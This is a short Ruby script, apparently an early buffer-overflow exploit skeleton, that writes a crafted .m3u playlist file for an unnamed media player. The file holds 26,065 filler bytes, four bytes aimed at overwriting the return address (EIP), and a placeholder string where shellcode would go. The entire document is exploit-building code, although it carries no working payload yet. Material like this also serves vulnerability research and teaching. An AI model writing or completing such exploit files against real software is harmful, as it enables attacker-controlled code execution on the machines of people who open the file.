#!/usr/bin/env ruby

file = "test1.m3u"

junk = "\x41" * 26065
eip = "\x42" * 4
presc = "XXXX"
shellcode = "1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK5ABCDEFGHIJK6ABCDEFGHIJK7ABCDEFGHIJK8ABCDEFGHIJK9ABCDEFGHIJKAABCDEFGHIJKBABCDEFGHIJKCABCDEFGHIJK"

exploit = junk + eip + presc + shellcode

File.open(file, 'w') {|f| f.write(exploit)}
puts "[*] File #{file} created"